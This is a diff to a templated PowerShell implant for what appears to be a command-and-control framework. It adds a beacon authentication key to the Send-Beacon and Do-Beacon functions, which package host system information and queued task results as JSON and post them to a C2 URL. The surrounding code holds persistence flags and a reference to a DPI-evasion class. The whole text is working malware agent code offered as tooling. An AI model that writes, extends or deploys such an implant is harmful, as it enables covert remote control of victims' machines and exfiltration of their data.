@@ -15,6 +15,7 @@ $global:Persist = {{if .Persist}}$true{{else}}$false{{end}}
 $global:Protocol = "{{.Protocol}}"
 $global:BeaconURI = "{{.BeaconURI}}"
 $global:BeaconMethod = "{{.Method}}"
+$global:BeaconKey = "{{.BeaconKey}}"
 $global:ListenerID = {{if .ListenerID}}{{.ListenerID}}{{else}}0{{end}}
 
 $global:AgentUUID = $null
@@ -131,6 +132,7 @@ function Send-Beacon {
     param($bodyJson)
     try {
         $headers = @{"Content-Type"="application/json"; "User-Agent"=$global:UserAgent}
+        if ($global:BeaconKey) { $headers["X-Beacon-Key"] = $global:BeaconKey }
         $uri = $global:C2URL + $global:BeaconURI
         if (-not $global:BeaconURI) { $uri = $global:C2URL + "/api/v1/beacon" }
         $method = if ($global:BeaconMethod) { $global:BeaconMethod } else { "Post" }
@@ -490,6 +492,11 @@ public class ForgeDpi {
 function Do-Beacon {
     $info = Get-SystemInfo
     $body = @{uuid=$global:AgentUUID; info=$info; results=$global:ResultsQueue} | ConvertTo-Json -Depth 5 -Compress
+    if ($global:BeaconKey) {
+        $h = $body | ConvertFrom-Json
+        $h | Add-Member -NotePropertyName key -NotePropertyValue $global:BeaconKey -Force
+        $body = $h | ConvertTo-Json -Depth 5 -Compress
+    }
     $body = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($body))
     $global:ResultsQueue = @()
     $resp = Send-Beacon -bodyJson $body
